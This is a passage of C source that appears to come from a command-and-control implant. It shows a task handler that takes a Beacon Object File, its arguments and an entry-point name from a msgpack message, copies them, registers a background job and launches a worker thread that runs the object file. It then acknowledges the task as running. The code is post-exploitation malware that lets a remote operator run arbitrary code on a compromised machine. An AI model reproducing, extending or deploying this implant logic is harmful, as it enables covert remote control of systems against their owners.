    for (uint32_t i = 0; i < map_count; i++) {
        const char *key;
        uint32_t key_len;
        if (mp_read_str(&reader, &key, &key_len) != 0) {
            mp_skip(&reader);
            mp_skip(&reader);
            continue;
        }

        if (key_len == 7 && ax_strncmp(key, "content", 7) == 0) {
            mp_read_bin(&reader, &bof_content, &bof_size);
        } else if (key_len == 4 && ax_strncmp(key, "args", 4) == 0) {
            mp_read_bin(&reader, &args, &args_size);
        } else if (key_len == 10 && ax_strncmp(key, "entry_func", 10) == 0) {
            mp_read_str(&reader, &entry_func, &entry_func_len);
        } else {
            mp_skip(&reader);
        }
    }

    if (!bof_content || bof_size == 0) {
        bof_error_response(response, BOF_ERR_PARSE, "No BOF content");
        return 0;
    }

    // Allocate job slot
    int job_idx = jobs_alloc(&g_job_ctx);
    if (job_idx < 0) {
        bof_error_response(response, BOF_ERR_ALLOC, "No free job slots");
        return 0;
    }

    // Prepare async arg with deep copies
    async_bof_arg_t *arg = (async_bof_arg_t *)ax_malloc(sizeof(async_bof_arg_t));
    if (!arg) {
        jobs_remove(&g_job_ctx, job_idx);
        bof_error_response(response, BOF_ERR_ALLOC, "Alloc failed");
        return 0;
    }
    ax_memset(arg, 0, sizeof(async_bof_arg_t));

    // Deep copy BOF data
    arg->bof_data = (uint8_t *)ax_malloc(bof_size);
    if (!arg->bof_data) {
        ax_free(arg);
        jobs_remove(&g_job_ctx, job_idx);
        bof_error_response(response, BOF_ERR_ALLOC, "BOF copy alloc failed");
        return 0;
    }
    ax_memcpy(arg->bof_data, bof_content, bof_size);
    arg->bof_size = bof_size;

    // Deep copy args
    if (args && args_size > 0) {
        arg->args_data = (uint8_t *)ax_malloc(args_size);
        if (arg->args_data)
            ax_memcpy(arg->args_data, args, args_size);
        arg->args_size = args_size;
    }

    // Copy entry name
    if (entry_func_len > 0 && entry_func_len < sizeof(arg->entry_name)) {
        ax_memcpy(arg->entry_name, entry_func, entry_func_len);
        arg->entry_name[entry_func_len] = '\0';
    } else {
        ax_strcpy(arg->entry_name, "go");
    }

    // Create stop pipe
    arg->stop_pipe[0] = -1;
    arg->stop_pipe[1] = -1;
    sys_pipe2(arg->stop_pipe, 0);

    // Setup job entry
    ax_snprintf(arg->job_id, sizeof(arg->job_id), "%08x", cmd_id);
    arg->job_idx = job_idx;

    job_entry_t *job = &g_job_ctx.jobs[job_idx];
    ax_strcpy(job->job_id, arg->job_id);
    job->job_type = BOF_PACK;
    job->active = 1;
    job->canceled = 0;
    job->conn.fd = -1;

    // Create worker thread
    if (jobs_thread_create(&job->thread, async_bof_thread, arg) != 0) {
        // Thread creation failed
        job->active = 0;
        if (arg->bof_data) ax_free(arg->bof_data);
        if (arg->args_data) ax_free(arg->args_data);
        if (arg->stop_pipe[0] >= 0) sys_close(arg->stop_pipe[0]);
        if (arg->stop_pipe[1] >= 0) sys_close(arg->stop_pipe[1]);
        ax_free(arg);
        jobs_remove(&g_job_ctx, job_idx);
        bof_error_response(response, BOF_ERR_ALLOC, "Thread creation failed");
        return 0;
    }

    // Ack: task running (not completed)
    mp_write_map(response, 1);
    mp_write_kv_str(response, "status", "running");

    return 0;
}
